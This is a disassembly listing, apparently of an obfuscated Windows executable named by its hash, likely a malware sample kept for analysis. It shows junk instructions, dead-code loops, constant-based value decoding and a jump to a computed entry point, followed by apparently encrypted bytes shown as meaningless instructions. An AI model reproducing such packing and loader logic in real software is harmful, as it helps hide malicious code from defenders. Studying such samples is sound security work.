
9088306873eda32a14e383458448828dba3e6fa0a656543503aa87144f75ffca.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x230
  401009:	add    DWORD PTR ds:0x4377a3,0x7b21
  401013:	push   esi
  401014:	or     DWORD PTR ds:0x4377b7,0x1d26
  40101e:	xor    eax,eax
  401020:	sbb    DWORD PTR ds:0x43774b,0x4377b7
  40102a:	mov    WORD PTR [ebp-0x24],ax
  40102e:	mov    DWORD PTR ds:0x437783,0x17
  401038:	cmp    DWORD PTR ds:0x437783,0x0
  40103f:	je     0x401075
  401045:	cmp    DWORD PTR ds:0x437783,0x23
  40104c:	jl     0x401075
  401052:	jmp    0x401065
  401057:	push   DWORD PTR [ebp-0x10]
  40105a:	push   0x43778f
  40105f:	call   DWORD PTR ds:0x43c960
  401065:	mov    eax,ds:0x437783
  40106a:	dec    eax
  40106b:	mov    ds:0x437783,eax
  401070:	jmp    0x401038
  401075:	mov    eax,ds:0x4375df
  40107a:	movzx  eax,BYTE PTR [eax]
  40107d:	push   eax
  40107e:	or     DWORD PTR ds:0x43774f,0x437783
  401088:	call   DWORD PTR ds:0x43ca38
  40108e:	cmp    eax,0x3
  401091:	mov    DWORD PTR ds:0x4377af,0x1a4e
  40109b:	jle    0x4010b7
  4010a1:	xor    eax,eax
  4010a3:	jmp    0x401a9e
  4010a8:	mov    DWORD PTR ds:0x4377b7,0x36bc
  4010b2:	jmp    0x4011b9
  4010b7:	push   0x0
  4010b9:	lea    eax,[ebp-0x1d0]
  4010bf:	or     DWORD PTR ds:0x4377af,0x4954
  4010c9:	push   eax
  4010ca:	sub    DWORD PTR ds:0x43770f,0x5936
  4010d4:	push   0x4374c3
  4010d9:	call   DWORD PTR ds:0x43c974
  4010df:	mov    DWORD PTR ds:0x43771f,0x19ca
  4010e9:	cmp    eax,0xffffffff
  4010ec:	mov    DWORD PTR ds:0x437773,0x6253
  4010f6:	je     0x401127
  4010fc:	and    DWORD PTR ds:0x43778f,0x437767
  401106:	xor    eax,eax
  401108:	mov    DWORD PTR ds:0x4377bb,0x7a95
  401112:	inc    eax
  401113:	mov    DWORD PTR ds:0x43778f,0x2676
  40111d:	jmp    0x401a9e
  401122:	jmp    0x4011b9
  401127:	push   0x8
  401129:	dec    DWORD PTR ds:0x43777b
  40112f:	push   0x4374eb
  401134:	push   0x87687663
  401139:	call   DWORD PTR ds:0x43c9c0
  40113f:	mov    DWORD PTR ds:0x43777f,0x66a5
  401149:	cmp    eax,0x8
  40114c:	jne    0x40117c
  401152:	mov    DWORD PTR ds:0x43774b,0x20c8
  40115c:	xor    eax,eax
  40115e:	mov    DWORD PTR ds:0x43775f,0x154c
  401168:	jmp    0x401a9e
  40116d:	mov    DWORD PTR ds:0x4377b3,0xffc
  401177:	jmp    0x4011b9
  40117c:	xor    DWORD PTR ds:0x43779b,0x43771b
  401186:	call   DWORD PTR ds:0x43c9d8
  40118c:	test   eax,eax
  40118e:	mov    DWORD PTR ds:0x43772f,0x40bc
  401198:	jne    0x4011b9
  40119e:	and    DWORD PTR ds:0x437793,0x2e57
  4011a8:	xor    eax,eax
  4011aa:	mov    DWORD PTR ds:0x4377af,0x587d
  4011b4:	jmp    0x401a9e
  4011b9:	sub    ecx,DWORD PTR ds:0x4377a7
  4011bf:	mov    DWORD PTR [ebp-0x20],0x0
  4011c6:	mov    DWORD PTR [ebp-0x148],0xf89c85b0
  4011d0:	adc    DWORD PTR ds:0x437717,edi
  4011d6:	mov    DWORD PTR [ebp-0x1dc],0xf89c85b3
  4011e0:	and    DWORD PTR ds:0x43772b,0x0
  4011ea:	jmp    0x4011fc
  4011ef:	mov    ecx,DWORD PTR ds:0x43772b
  4011f5:	inc    ecx
  4011f6:	mov    DWORD PTR ds:0x43772b,ecx
  4011fc:	cmp    DWORD PTR ds:0x43772b,0x10
  401203:	jae    0x40124a
  401209:	cmp    DWORD PTR ds:0x43772b,0xb
  401210:	ja     0x40124a
  401216:	jmp    0x40122b
  40121b:	push   0x43701b
  401220:	push   0x43707c
  401225:	call   DWORD PTR ds:0x43c964
  40122b:	cmp    DWORD PTR ds:0x43772b,0xa
  401232:	jne    0x401245
  401238:	mov    ecx,DWORD PTR ds:0x43772b
  40123e:	inc    ecx
  40123f:	mov    DWORD PTR ds:0x43772b,ecx
  401245:	jmp    0x4011ef
  40124a:	lea    eax,[ebp-0x1d8]
  401250:	mov    DWORD PTR [ebp-0x13c],eax
  401256:	lea    eax,[ebp-0x4]
  401259:	mov    ecx,DWORD PTR ds:0x43774f
  40125f:	and    DWORD PTR ds:0x437737,ecx
  401265:	mov    DWORD PTR [ebp-0x140],eax
  40126b:	mov    eax,ds:0x43739f
  401270:	mov    eax,DWORD PTR [eax+0x1c8]
  401276:	mov    eax,DWORD PTR [eax]
  401278:	mov    DWORD PTR ds:0x437737,0x16
  401282:	cmp    DWORD PTR ds:0x437737,0x0
  401289:	je     0x4012be
  40128f:	cmp    DWORD PTR ds:0x437737,0x1c
  401296:	jbe    0x4012be
  40129c:	jmp    0x4012ac
  4012a1:	push   0x437042
  4012a6:	call   DWORD PTR ds:0x43c968
  4012ac:	mov    ecx,DWORD PTR ds:0x437737
  4012b2:	dec    ecx
  4012b3:	mov    DWORD PTR ds:0x437737,ecx
  4012b9:	jmp    0x401282
  4012be:	xor    eax,0x75108b5
  4012c3:	add    eax,0x3272fb
  4012c8:	mov    DWORD PTR ds:0x43779b,0x40d
  4012d2:	mov    ecx,DWORD PTR [ebp-0x140]
  4012d8:	mov    DWORD PTR [ecx],eax
  4012da:	mov    DWORD PTR ds:0x43778f,0x630f
  4012e4:	lea    eax,[ebp-0x10]
  4012e7:	mov    DWORD PTR [ebp-0x12c],eax
  4012ed:	cmp    DWORD PTR ds:0x4375d3,0x456dfdfb
  4012f7:	mov    DWORD PTR ds:0x43776f,0x19c2
  401301:	jne    0x401496
  401307:	and    DWORD PTR ds:0x43771b,0x0
  401311:	jmp    0x401324
  401316:	xor    eax,eax
  401318:	xor    eax,DWORD PTR ds:0x43771b
  40131e:	inc    eax
  40131f:	mov    ds:0x43771b,eax
  401324:	cmp    DWORD PTR ds:0x43771b,0x15
  40132b:	jae    0x40137e
  401331:	cmp    DWORD PTR ds:0x43771b,0x8
  401338:	jbe    0x40137e
  40133e:	jmp    0x401361
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   0x437727
  40134b:	push   0x4762
  401350:	push   0x437104
  401355:	push   DWORD PTR [ebp-0x18]
  401358:	push   DWORD PTR [ebp-0x14]
  40135b:	call   DWORD PTR ds:0x43c96c
  401361:	cmp    DWORD PTR ds:0x43771b,0x7
  401368:	jne    0x401379
  40136e:	mov    eax,ds:0x43771b
  401373:	inc    eax
  401374:	mov    ds:0x43771b,eax
  401379:	jmp    0x401316
  40137e:	mov    eax,DWORD PTR [ebp-0x148]
  401384:	dec    ecx
  401385:	xor    eax,0x75108b5
  40138a:	add    eax,0x3272fb
  40138f:	mov    ecx,DWORD PTR ds:0x43739f
  401395:	mov    ecx,DWORD PTR [ecx+0x198]
  40139b:	sbb    DWORD PTR ds:0x43772f,0x437773
  4013a5:	mov    DWORD PTR [ecx],eax
  4013a7:	or     ecx,DWORD PTR ds:0x43775f
  4013ad:	mov    eax,DWORD PTR [ebp-0x148]
  4013b3:	mov    DWORD PTR ds:0x437753,0x15
  4013bd:	cmp    DWORD PTR ds:0x437753,0x0
  4013c4:	je     0x401418
  4013ca:	cmp    DWORD PTR ds:0x437753,0x9
  4013d1:	jg     0x401418
  4013d7:	jmp    0x4013ea
  4013dc:	push   0x43775b
  4013e1:	push   DWORD PTR [ebp-0xc]
  4013e4:	call   DWORD PTR ds:0x43c970
  4013ea:	cmp    DWORD PTR ds:0x437753,0xa
  4013f1:	jne    0x401404
  4013f7:	mov    ecx,DWORD PTR ds:0x437753
  4013fd:	dec    ecx
  4013fe:	mov    DWORD PTR ds:0x437753,ecx
  401404:	xor    ecx,ecx
  401406:	xor    ecx,DWORD PTR ds:0x437753
  40140c:	dec    ecx
  40140d:	mov    DWORD PTR ds:0x437753,ecx
  401413:	jmp    0x4013bd
  401418:	xor    eax,0x75108b5
  40141d:	and    DWORD PTR ds:0x43777b,0x0
  401427:	mov    ecx,DWORD PTR ds:0x43777b
  40142d:	inc    ecx
  40142e:	mov    DWORD PTR ds:0x43777b,ecx
  401434:	cmp    DWORD PTR ds:0x43777b,0x15
  40143b:	jl     0x401471
  401441:	jmp    0x401464
  401446:	push   DWORD PTR [ebp-0x14]
  401449:	push   0x43773f
  40144e:	push   DWORD PTR [ebp-0x1c]
  401451:	push   0x43706e
  401456:	push   0x8166
  40145b:	push   DWORD PTR [ebp-0x10]
  40145e:	call   DWORD PTR ds:0x43c978
  401464:	cmp    DWORD PTR ds:0x43777b,0x12
  40146b:	jb     0x401427
  401471:	add    eax,0x3272fb
  401476:	mov    ds:0x4375d3,eax
  40147b:	mov    eax,DWORD PTR [ebp-0x148]
  401481:	or     DWORD PTR ds:0x4377b3,edx
  401487:	xor    eax,0x75108b5
  40148c:	add    eax,0x3272fb
  401491:	mov    ds:0x437497,eax
  401496:	xor    DWORD PTR ds:0x43772b,ebx
  40149c:	mov    eax,ds:0x43739f
  4014a1:	mov    eax,DWORD PTR [eax+0x18c]
  4014a7:	mov    ecx,DWORD PTR [ebp-0x12c]
  4014ad:	neg    DWORD PTR ds:0x4377b7
  4014b3:	mov    eax,DWORD PTR [eax]
  4014b5:	sbb    DWORD PTR ds:0x437713,0x4377b3
  4014bf:	mov    DWORD PTR [ecx],eax
  4014c1:	mov    DWORD PTR [ebp-0x128],0xf89c85bc
  4014cb:	mov    DWORD PTR ds:0x437797,0x10
  4014d5:	cmp    DWORD PTR ds:0x437797,0x0
  4014dc:	je     0x40152b
  4014e2:	cmp    DWORD PTR ds:0x437797,0x20
  4014e9:	jg     0x40152b
  4014ef:	jmp    0x401518
  4014f4:	push   0x4370c1
  4014f9:	push   0x6f44
  4014fe:	push   0x27cf
  401503:	push   0x84b9
  401508:	push   0x17d9
  40150d:	push   0x366e
  401512:	call   DWORD PTR ds:0x43c97c
  401518:	xor    eax,eax
  40151a:	add    eax,DWORD PTR ds:0x437797
  401520:	dec    eax
  401521:	mov    ds:0x437797,eax
  401526:	jmp    0x4014d5
  40152b:	mov    DWORD PTR [ebp-0xc],0xf89c85bc
  401532:	movzx  eax,WORD PTR ds:0x437763
  401539:	sub    DWORD PTR ds:0x437773,eax
  40153f:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  401546:	mov    eax,ds:0x43778b
  40154b:	adc    DWORD PTR ds:0x43776b,eax
  401551:	mov    eax,ds:0x437463
  401556:	mov    eax,DWORD PTR [eax]
  401558:	mov    DWORD PTR [ebp-0x124],eax
  40155e:	mov    DWORD PTR [ebp-0x130],0xf89c85b0
  401568:	sbb    DWORD PTR ds:0x43773f,0x437793
  401572:	mov    DWORD PTR [ebp-0x138],0xf89c85bc
  40157c:	sub    eax,DWORD PTR ds:0x437743
  401582:	mov    DWORD PTR [ebp-0x1e4],0xf89c85b8
  40158c:	mov    eax,DWORD PTR [ebp-0x148]
  401592:	xor    eax,0x75108b5
  401597:	add    eax,0x3272fb
  40159c:	mov    DWORD PTR ds:0x4377af,0x1731
  4015a6:	mov    DWORD PTR [ebp-0x1e8],eax
  4015ac:	jmp    0x4015e1
  4015b1:	sub    DWORD PTR ds:0x4377b3,ecx
  4015b7:	mov    eax,DWORD PTR [ebp-0x1dc]
  4015bd:	neg    DWORD PTR ds:0x437723
  4015c3:	xor    eax,0x75108b5
  4015c8:	or     DWORD PTR ds:0x437733,ecx
  4015ce:	mov    ecx,DWORD PTR [ebp-0x1e8]
  4015d4:	lea    eax,[ecx+eax*1+0x3272fb]
  4015db:	mov    DWORD PTR [ebp-0x1e8],eax
  4015e1:	mov    eax,DWORD PTR [ebp-0x1dc]
  4015e7:	and    DWORD PTR ds:0x437753,0x0
  4015f1:	mov    ecx,DWORD PTR ds:0x437753
  4015f7:	inc    ecx
  4015f8:	mov    DWORD PTR ds:0x437753,ecx
  4015fe:	cmp    DWORD PTR ds:0x437753,0x4
  401605:	jbe    0x40164e
  40160b:	jmp    0x401625
  401610:	push   0x437089
  401615:	push   0x437000
  40161a:	push   0x400000
  40161f:	call   DWORD PTR ds:0x43c980
  401625:	cmp    DWORD PTR ds:0x437753,0x3
  40162c:	jne    0x401641
  401632:	xor    ecx,ecx
  401634:	xor    ecx,DWORD PTR ds:0x437753
  40163a:	inc    ecx
  40163b:	mov    DWORD PTR ds:0x437753,ecx
  401641:	cmp    DWORD PTR ds:0x437753,0x10
  401648:	jb     0x4015f1
  40164e:	xor    eax,0x75108b5
  401653:	mov    ecx,DWORD PTR [ebp-0x1dc]
  401659:	neg    DWORD PTR ds:0x43777f
  40165f:	xor    ecx,0x75108b5
  401665:	or     DWORD PTR ds:0x43774b,0x7a77
  40166f:	lea    eax,[eax+ecx*1+0x64e5f6]
  401676:	mov    DWORD PTR ds:0x43779f,0x1f
  401680:	cmp    DWORD PTR ds:0x43779f,0x0
  401687:	je     0x4016c6
  40168d:	cmp    DWORD PTR ds:0x43779f,0x26
  401694:	jbe    0x4016c6
  40169a:	jmp    0x4016b4
  40169f:	push   DWORD PTR [ebp-0x28]
  4016a2:	push   DWORD PTR [ebp-0x28]
  4016a5:	push   DWORD PTR [ebp-0xc]
  4016a8:	push   DWORD PTR [ebp-0x18]
  4016ab:	push   DWORD PTR [ebp-0x18]
  4016ae:	call   DWORD PTR ds:0x43c984
  4016b4:	mov    ecx,DWORD PTR ds:0x43779f
  4016ba:	dec    ecx
  4016bb:	mov    DWORD PTR ds:0x43779f,ecx
  4016c1:	jmp    0x401680
  4016c6:	mov    ecx,DWORD PTR [ebp-0x1dc]
  4016cc:	xor    ecx,0x75108b5
  4016d2:	lea    eax,[eax+ecx*1+0x3272fb]
  4016d9:	cmp    DWORD PTR [ebp-0x1e8],eax
  4016df:	ja     0x401726
  4016e5:	mov    eax,DWORD PTR [ebp-0x1dc]
  4016eb:	xor    eax,0x75108b5
  4016f0:	mov    ecx,DWORD PTR [ebp-0x1e8]
  4016f6:	lea    eax,[ecx+eax*1+0x3272fb]
  4016fd:	push   eax
  4016fe:	mov    eax,DWORD PTR [ebp-0x130]
  401704:	xor    eax,0x75108b5
  401709:	lea    eax,[ebp+eax*1+0x327303]
  401710:	push   eax
  401711:	mov    eax,ds:0x43739f
  401716:	push   DWORD PTR [eax+0x1bc]
  40171c:	call   0x401ab4
  401721:	jmp    0x4015b1
  401726:	mov    eax,DWORD PTR [ebp+0xc]
  401729:	mov    ds:0x437223,eax
  40172e:	mov    eax,DWORD PTR [ebp+0x10]
  401731:	mov    ds:0x43747f,eax
  401736:	mov    eax,ds:0x437223
  40173b:	sub    eax,0x3272fb
  401740:	xor    eax,0x75108b5
  401745:	mov    ecx,DWORD PTR [ebp-0x13c]
  40174b:	mov    DWORD PTR [ecx],eax
  40174d:	lea    eax,[ebp-0x144]
  401753:	mov    DWORD PTR [ebp-0x1e0],eax
  401759:	lea    eax,[ebp-0x1e0]
  40175f:	mov    DWORD PTR [ebp-0x134],eax
  401765:	lea    eax,[ebp+0x4]
  401768:	mov    ecx,DWORD PTR [ebp-0x1e0]
  40176e:	mov    DWORD PTR [ecx],eax
  401770:	mov    eax,DWORD PTR [ebp-0x1d8]
  401776:	xor    eax,0x75108b5
  40177b:	add    eax,0x3272fb
  401780:	xor    ecx,ecx
  401782:	sub    eax,0x5424137
  401787:	sbb    ecx,0x0
  40178a:	xor    eax,0x8a29a14b
  40178f:	xor    ecx,0x0
  401792:	mov    DWORD PTR [ebp-0x210],eax
  401798:	mov    DWORD PTR [ebp-0x20c],ecx
  40179e:	cmp    DWORD PTR [ebp-0x210],0x70941f81
  4017a8:	jne    0x4017bb
  4017ae:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  4017b5:	je     0x401831
  4017bb:	mov    eax,DWORD PTR [ebp-0x148]
  4017c1:	xor    eax,0x75108b5
  4017c6:	add    eax,0x3272fb
  4017cb:	mov    ecx,eax
  4017cd:	xor    esi,esi
  4017cf:	sub    ecx,0x5424137
  4017d5:	sbb    esi,0x0
  4017d8:	xor    ecx,0x8a29a14b
  4017de:	xor    esi,0x0
  4017e1:	mov    eax,DWORD PTR [ebp-0x4]
  4017e4:	cdq    
  4017e5:	sub    eax,0x5424137
  4017ea:	sbb    edx,0x0
  4017ed:	xor    eax,0x8a29a14b
  4017f2:	xor    edx,0x0
  4017f5:	mov    DWORD PTR [ebp-0x218],ecx
  4017fb:	mov    DWORD PTR [ebp-0x214],esi
  401801:	mov    DWORD PTR [ebp-0x220],eax
  401807:	mov    DWORD PTR [ebp-0x21c],edx
  40180d:	mov    eax,DWORD PTR [ebp-0x218]
  401813:	cmp    eax,DWORD PTR [ebp-0x220]
  401819:	jne    0x4019dc
  40181f:	mov    eax,DWORD PTR [ebp-0x214]
  401825:	cmp    eax,DWORD PTR [ebp-0x21c]
  40182b:	jne    0x4019dc
  401831:	mov    eax,DWORD PTR [ebp-0x148]
  401837:	xor    eax,0x75108b5
  40183c:	add    eax,0x3272fb
  401841:	xor    ecx,ecx
  401843:	sub    eax,0x5424137
  401848:	sbb    ecx,0x0
  40184b:	xor    eax,0x8a29a14b
  401850:	xor    ecx,0x0
  401853:	mov    edx,DWORD PTR [ebp-0x10]
  401856:	xor    esi,esi
  401858:	sub    edx,0x5424137
  40185e:	sbb    esi,0x0
  401861:	xor    edx,0x8a29a14b
  401867:	xor    esi,0x0
  40186a:	mov    DWORD PTR [ebp-0x228],eax
  401870:	mov    DWORD PTR [ebp-0x224],ecx
  401876:	mov    DWORD PTR [ebp-0x230],edx
  40187c:	mov    DWORD PTR [ebp-0x22c],esi
  401882:	mov    eax,DWORD PTR [ebp-0x228]
  401888:	cmp    eax,DWORD PTR [ebp-0x230]
  40188e:	jne    0x401936
  401894:	mov    eax,DWORD PTR [ebp-0x224]
  40189a:	cmp    eax,DWORD PTR [ebp-0x22c]
  4018a0:	jne    0x401936
  4018a6:	mov    eax,DWORD PTR [ebp-0x148]
  4018ac:	xor    eax,0x75108b5
  4018b1:	add    eax,0x3272fb
  4018b6:	mov    ecx,DWORD PTR ds:0x43739f
  4018bc:	mov    ecx,DWORD PTR [ecx+0x198]
  4018c2:	cmp    eax,DWORD PTR [ecx]
  4018c4:	jne    0x4018f1
  4018ca:	mov    eax,DWORD PTR [ebp-0x148]
  4018d0:	xor    eax,0x75108b5
  4018d5:	add    eax,0x3272fb
  4018da:	push   eax
  4018db:	push   0xf89c85bc
  4018e0:	push   DWORD PTR [ebp-0x1dc]
  4018e6:	push   DWORD PTR [ebp-0x148]
  4018ec:	call   0x414de4
  4018f1:	push   0xf89c85f0
  4018f6:	push   0xf89c87b0
  4018fb:	push   DWORD PTR [ebp-0x1dc]
  401901:	push   DWORD PTR [ebp-0x148]
  401907:	call   0x4155f6
  40190c:	mov    eax,DWORD PTR [ebp-0x148]
  401912:	xor    eax,0x75108b5
  401917:	add    eax,0x3272fb
  40191c:	mov    ds:0x43742b,eax
  401921:	mov    eax,DWORD PTR [ebp-0x148]
  401927:	xor    eax,0x75108b5
  40192c:	add    eax,0x3272fb
  401931:	mov    ds:0x437423,eax
  401936:	mov    eax,DWORD PTR [ebp-0x1e0]
  40193c:	mov    eax,DWORD PTR [eax]
  40193e:	mov    ecx,DWORD PTR [ebp-0x148]
  401944:	xor    ecx,0x75108b5
  40194a:	add    ecx,0x3272fb
  401950:	cmp    eax,ecx
  401952:	je     0x4019d7
  401958:	mov    DWORD PTR [ebp-0x1ec],0xf152c3b
  401962:	mov    DWORD PTR [ebp-0x1f8],0x712edce
  40196c:	mov    DWORD PTR [ebp-0x1f4],0x373fc28
  401976:	mov    DWORD PTR [ebp-0x1f0],0x72670ad8
  401980:	lea    eax,[ebp-0x1f0]
  401986:	push   eax
  401987:	lea    eax,[ebp-0x1f4]
  40198d:	push   eax
  40198e:	lea    eax,[ebp-0x1f8]
  401994:	push   eax
  401995:	lea    eax,[ebp-0x1ec]
  40199b:	push   eax
  40199c:	call   0x42d44a
  4019a1:	push   DWORD PTR [ebp-0x134]
  4019a7:	push   DWORD PTR [ebp-0x1d4]
  4019ad:	push   DWORD PTR [ebp-0x1dc]
  4019b3:	push   DWORD PTR [ebp-0x148]
  4019b9:	call   0x40408a
  4019be:	push   0x4
  4019c0:	mov    eax,ds:0x43739f
  4019c5:	add    eax,0x1cc
  4019ca:	push   eax
  4019cb:	lea    eax,[ebp-0x1d4]
  4019d1:	push   eax
  4019d2:	call   0x401ab4
  4019d7:	jmp    0x401a96
  4019dc:	lea    eax,[ebp-0x1fc]
  4019e2:	mov    DWORD PTR [ebp-0x208],eax
  4019e8:	lea    eax,[ebp-0x200]
  4019ee:	mov    DWORD PTR [ebp-0x204],eax
  4019f4:	mov    eax,DWORD PTR [ebp-0x204]
  4019fa:	mov    ecx,DWORD PTR ds:0x43739f
  401a00:	mov    DWORD PTR [eax],ecx
  401a02:	push   0x4
  401a04:	mov    eax,DWORD PTR [ebp-0x200]
  401a0a:	push   DWORD PTR [eax+0x194]
  401a10:	push   DWORD PTR [ebp-0x208]
  401a16:	call   0x401ab4
  401a1b:	mov    eax,DWORD PTR [ebp-0x208]
  401a21:	mov    eax,DWORD PTR [eax]
  401a23:	mov    ecx,DWORD PTR [ebp-0x200]
  401a29:	mov    ecx,DWORD PTR [ecx+0x194]
  401a2f:	mov    edx,DWORD PTR [ebp-0x200]
  401a35:	mov    edx,DWORD PTR [edx+0x194]
  401a3b:	mov    edx,DWORD PTR [edx]
  401a3d:	mov    ecx,DWORD PTR [ecx]
  401a3f:	mov    edx,DWORD PTR [edx+0x3c]
  401a42:	add    eax,DWORD PTR [ecx+edx*1+0x28]
  401a46:	mov    ecx,DWORD PTR [ebp-0x208]
  401a4c:	mov    DWORD PTR [ecx],eax
  401a4e:	push   DWORD PTR ds:0x43747f
  401a54:	push   DWORD PTR ds:0x437223
  401a5a:	mov    eax,ds:0x43739f
  401a5f:	mov    eax,DWORD PTR [eax+0x194]
  401a65:	push   DWORD PTR [eax]
  401a67:	mov    eax,DWORD PTR [ebp-0x1fc]
  401a6d:	call   eax
  401a6f:	mov    ecx,DWORD PTR ds:0x43739f
  401a75:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401a7b:	mov    DWORD PTR [ecx],eax
  401a7d:	push   0x4
  401a7f:	mov    eax,ds:0x43739f
  401a84:	add    eax,0x1cc
  401a89:	push   eax
  401a8a:	lea    eax,[ebp-0x1d4]
  401a90:	push   eax
  401a91:	call   0x401ab4
  401a96:	mov    eax,DWORD PTR [ebp-0x1d4]
  401a9c:	mov    eax,DWORD PTR [eax]
  401a9e:	pop    esi
  401a9f:	leave  
  401aa0:	ret    0xc
  401aa3:	push   ebp
  401aa4:	mov    ebp,esp
  401aa6:	xor    eax,eax
  401aa8:	and    DWORD PTR ds:0x437743,0x43770f
  401ab2:	pop    ebp
  401ab3:	ret    
  401ab4:	push   ebp
  401ab5:	mov    ebp,esp
  401ab7:	sub    esp,0x2c
  401aba:	and    DWORD PTR ds:0x437777,0x0
  401ac4:	jmp    0x401ad8
  401ac9:	xor    edx,edx
  401acb:	add    edx,DWORD PTR ds:0x437777
  401ad1:	inc    edx
  401ad2:	mov    DWORD PTR ds:0x437777,edx
  401ad8:	cmp    DWORD PTR ds:0x437777,0x18
  401adf:	jae    0x401b21
  401ae5:	cmp    DWORD PTR ds:0x437777,0x6
  401aec:	jg     0x401b21
  401af2:	jmp    0x401b00
  401af7:	push   DWORD PTR [ebp-0x28]
  401afa:	call   DWORD PTR ds:0x43c988
  401b00:	cmp    DWORD PTR ds:0x437777,0x5
  401b07:	jne    0x401b1c
  401b0d:	xor    edx,edx
  401b0f:	add    edx,DWORD PTR ds:0x437777
  401b15:	inc    edx
  401b16:	mov    DWORD PTR ds:0x437777,edx
  401b1c:	jmp    0x401ac9
  401b21:	push   esi
  401b22:	or     DWORD PTR ds:0x43770f,0x7b2e
  401b2c:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  401b33:	and    DWORD PTR ds:0x43779b,0x0
  401b3d:	jmp    0x401b4d
  401b42:	mov    eax,ds:0x43779b
  401b47:	inc    eax
  401b48:	mov    ds:0x43779b,eax
  401b4d:	cmp    DWORD PTR ds:0x43779b,0x18
  401b54:	jae    0x401b97
  401b5a:	cmp    DWORD PTR ds:0x43779b,0xa
  401b61:	jbe    0x401b97
  401b67:	jmp    0x401b7a
  401b6c:	push   0x4590
  401b71:	push   DWORD PTR [ebp-0x10]
  401b74:	call   DWORD PTR ds:0x43c98c
  401b7a:	cmp    DWORD PTR ds:0x43779b,0x9
  401b81:	jne    0x401b92
  401b87:	mov    eax,ds:0x43779b
  401b8c:	inc    eax
  401b8d:	mov    ds:0x43779b,eax
  401b92:	jmp    0x401b42
  401b97:	mov    DWORD PTR [ebp-0x8],0xf89c85b3
  401b9e:	mov    eax,DWORD PTR [ebp-0x4]
  401ba1:	add    edx,0x774
  401ba7:	xor    eax,0x75108b5
  401bac:	add    eax,0x3272fb
  401bb1:	add    DWORD PTR ds:0x437753,0x3afa
  401bbb:	xor    ecx,ecx
  401bbd:	and    edx,DWORD PTR ds:0x437767
  401bc3:	mov    edx,DWORD PTR [ebp+0x10]
  401bc6:	xor    esi,esi
  401bc8:	sub    edx,0x5424137
  401bce:	mov    DWORD PTR ds:0x43779f,0x3ed0
  401bd8:	sbb    esi,0x0
  401bdb:	sub    DWORD PTR ds:0x437747,0x437777
  401be5:	xor    edx,0x8a29a14b
  401beb:	xor    esi,0x0
  401bee:	xor    edx,0x8a29a14b
  401bf4:	xor    esi,0x0
  401bf7:	adc    DWORD PTR ds:0x43775f,0x43772f
  401c01:	add    edx,0x5424137
  401c07:	adc    esi,0x0
  401c0a:	mov    DWORD PTR [ebp-0x14],eax
  401c0d:	mov    DWORD PTR ds:0x43772f,0x4892
  401c17:	mov    DWORD PTR [ebp-0x10],ecx
  401c1a:	mov    DWORD PTR [ebp-0x1c],edx
  401c1d:	movzx  eax,BYTE PTR ds:0x43770f
  401c24:	mov    DWORD PTR [ebp-0x18],esi
  401c27:	mov    eax,DWORD PTR [ebp-0x14]
  401c2a:	cmp    eax,DWORD PTR [ebp-0x1c]
  401c2d:	mov    DWORD PTR ds:0x437747,0x1bf2
  401c37:	jne    0x401c53
  401c3d:	mov    eax,DWORD PTR [ebp-0x10]
  401c40:	mov    DWORD PTR ds:0x43777f,0x6546
  401c4a:	cmp    eax,DWORD PTR [ebp-0x18]
  401c4d:	je     0x404080
  401c53:	mov    eax,DWORD PTR [ebp+0xc]
  401c56:	mov    DWORD PTR ds:0x43774b,0x1906
  401c60:	cmp    eax,DWORD PTR [ebp+0x8]
  401c63:	mov    DWORD PTR ds:0x4377b7,0x6132
  401c6d:	je     0x404080
  401c73:	mov    eax,DWORD PTR [ebp-0x4]
  401c76:	xor    eax,0x75108b5
  401c7b:	add    eax,0x3272fb
  401c80:	jmp    0x403fce
  401c85:	int3   
  401c86:	xor    al,0xbc
  401c88:	push   ss
  401c89:	fs jbe 0x401ce0
  401c8c:	je     0x401c61
  401c8e:	or     DWORD PTR [edx+0x4f],0xffffff9e
  401c92:	push   ecx
  401c93:	jecxz  0x401ca9
  401c95:	jnp    0x401d12
  401c97:	jnp    0x401d14
  401c99:	stos   BYTE PTR es:[edi],al
  401c9a:	cwde   
  401c9b:	jnp    0x401d18
  401c9d:	rol    ebx,cl
  401c9f:	mov    esi,0xe4d7cdd6
  401ca4:	(bad)  
  401ca5:	fcmovnb st,st(4)
  401ca7:	cmc    
  401ca8:	(bad)  
  401ca9:	fucomi st,st(6)
  401cab:	ror    edx,cl
  401cad:	mov    eax,0xcdcccfdf
  401cb2:	int3   
  401cb3:	sar    esi,cl
  401cb5:	inc    BYTE PTR [edx]
  401cb7:	retf   
  401cb8:	or     ch,dl
  401cba:	(bad)  
  401cbc:	enter  0xb8b3,0xd1
  401cc0:	mov    al,0xb0
  401cc2:	not    eax
  401cc4:	lods   al,BYTE PTR ds:[esi]
  401cc5:	out    dx,al
  401cc6:	ror    bl,0xf9
  401cc9:	aam    0xd6
  401ccb:	ret    
  401ccc:	ret    
  401ccd:	mov    ebp,0xdbe2e703
  401cd2:	idiv   ebp
  401cd4:	or     eax,esp
  401cd6:	leave  
  401cd7:	aam    0xc5
  401cd9:	or     ecx,esp
  401cdb:	add    DWORD PTR ds:0xb2c0d1c9,ecx
  401ce1:	in     al,0xe8
  401ce3:	icebp  
  401ce4:	sar    DWORD PTR [ebx-0x3244073c],0xb8
  401ceb:	jmp    0x401cdd
  401ced:	out    dx,al
  401cee:	aam    0xb8
  401cf0:	ret    
  401cf1:	neg    dh
  401cf3:	(bad)  
  401cf4:	fcomip st,st(7)
  401cf6:	xlat   BYTE PTR ds:[ebx]
  401cf7:	add    bl,ah
  401cf9:	enter  0xe604,0x11
  401cfd:	mov    edi,0xe4e1dcc7
  401d02:	call   0xd51317e7
  401d07:	mov    ah,0xeb
  401d09:	(bad)  
  401d0b:	idiv   BYTE PTR [edi+esi*4-0x21380c18]
  401d12:	push   es
  401d13:	add    al,0xe3
  401d15:	pop    es
  401d16:	jmp    0xfad8:0x13da08f4
  401d1d:	les    esi,FWORD PTR [ebx-0x281e230f]
  401d23:	lock mov ch,0xb9
  401d26:	mov    edx,0xbcf2acb5
  401d2b:	xlat   BYTE PTR ds:[ebx]
  401d2c:	jecxz  0x401cec
  401d2e:	(bad)  
  401d2f:	in     al,dx
  401d30:	in     al,dx
  401d31:	jecxz  0x401d34
  401d33:	icebp  
  401d34:	stc    
  401d35:	call   0xca4bf51d
